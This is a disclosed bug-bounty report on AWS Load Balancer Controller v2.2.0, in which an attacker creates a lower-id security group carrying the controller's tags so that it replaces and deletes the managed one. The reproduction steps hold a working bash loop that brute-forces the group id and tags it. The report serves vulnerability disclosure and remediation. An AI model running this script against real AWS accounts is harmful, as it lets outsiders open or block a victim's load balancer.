# AWS Load Balancer Controller Managed Security Groups can be replaced by an unprivileged attacker

## Report Details
- **Report ID**: 1238017
- **URL**: https://hackerone.com/reports/1238017
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-19T05:28:34.928Z
- **Disclosed**: 2022-06-02T00:49:52.513Z

## Reporter
- **Username**: t0rr3sp3dr0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
When creating an Ingress of class `alb`, by default, AWS Load Balancer Controller creates a managed SG and attaches it to the created ALB. This SG limits which ports of the ALB are accessible by whom.

An attacker is able to craft another SG that can be used to trick AWS Load Balancer Controller into changing the SG attached to an ALB. This is possible even though the attacker doesn't have permission to modify the ALB or the managed SG and also doesn't have access to the K8s cluster where the Ingress was created.

AWS Load Balancer Controller uses tree tags to associate a SG on AWS to the supposed managed SG created for an ALB: `elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, and `ingress.k8s.aws/resource`. When there are multiple SGs that match the expected tag values, the controller attaches the first one returned by the AWS SDK to the ALB and deletes the other ones. The API call returns SGs sorted by their respective ids.

If a SG is created with the tags expected by AWS Load Balancer Controller and its id is less than the one from the legit SG, the controller deletes the original SG and attaches the one created by the attacker to the ALB. An attacker is now able to manipulate SG rules for the ALB as they please.  

## Kubernetes Version:
version.Info{Major:"1", Minor:"20+", GitVersion:"v1.20.4-eks-6b7464", GitCommit:"6b746440c04cb81db4426842b4ae65c3f7035e53", GitTreeState:"clean", BuildDate:"2021-03-19T19:33:03Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}

## Component Version:
AWS Load Balancer Controller v2.2.0

## Steps To Reproduce:

1. A developer creates an application, deploys it to K8s, and exposes it using an Ingress with class `alb`.
```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/aws-alb-ingress-controller/v1.1.9/docs/examples/echoservice/echoserver-namespace.yaml
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/aws-alb-ingress-controller/v1.1.9/docs/examples/echoservice/echoserver-service.yaml
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/aws-alb-ingress-controller/v1.1.9/docs/examples/echoservice/echoserver-deployment.yaml
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/aws-alb-ingress-controller/v1.1.9/docs/examples/echoservice/echoserver-ingress.yaml
```

2. An attacker crafts an evil-twin of the managed SG attached to the target ALB. The attacker either knows the cluster name, namespace, and name of the Ingress related to the target ALB, or it needs to be able to describe the load balancer and its security group to acquire this information. If the id of the managed SG is unknown, the attacker may assume that its value is as low as `sg-00800000000000000` and create a SG that has an id even lower, covering more than 96% of the possible security groups with a couple of minutes of brute-forcing.
```bash
VPC_ID=vpc-00123456789abcdef
CLUSTER_NAME=kind
NAMESPACED_NAME=echoserver/echoserver

MANAGED_SG_ID=sg-00123456789abcdef
MANAGED_SG_10=$(echo ${MANAGED_SG_ID} | awk '{ print "ibase=16;" toupper(substr($0,4)) }' | bc)

while true
do
	UNMANAGED_SG_ID=$(aws ec2 create-security-group --description unmanaged-sg --group-name unmanaged-sg --vpc-id ${VPC_ID} | jq -r .GroupId)
	UNMANAGED_SG_10=$(echo ${UNMANAGED_SG_ID} | awk '{ print "ibase=16;" toupper(substr($0,4)) }' | bc)

	if [ ${UNMANAGED_SG_10} -lt ${MANAGED_SG_10} ]
	then
		break
	fi

	aws ec2 delete-security-group --group-id ${UNMANAGED_SG_ID}
done

aws ec2 create-tags --resources ${UNMANAGED_SG_ID} --tags "Key=elbv2.k8s.aws/cluster,Value=${CLUSTER_NAME}" "Key=ingress.k8s.aws/stack,Value=${NAMESPACED_NAME}" "Key=ingress.k8s.aws/resource,Value=ManagedLBSecurityGroup"
```

3. With the environment set, the attacker now should wait or somehow cause AWS Load Balancer Controller to reconcile the target load balancer. The reconciliation is normally triggered when the Ingress resource is modified or when the Pod of the controller restarts or is recreated, like when the Node where the controller was running is drained on a downscale procedure. Without another exploit or with a higher privilege on the account, user interaction is required.

4. After reconciliation, the load balancer has the malicious security group attached instead of the managed one that was created by the controller. The attacker modifies the SG rules and either gains access to the service or causes a denial of service.

## Impact

The attacker has access to all ports of the targeted ALB and can possibly gain access to sensitive data from the service behind the load balancer or make calls that would cause some problem. It is also capable of blocking access of legitimate clients to the service, causing a denial of service.

## Attachments
No attachments
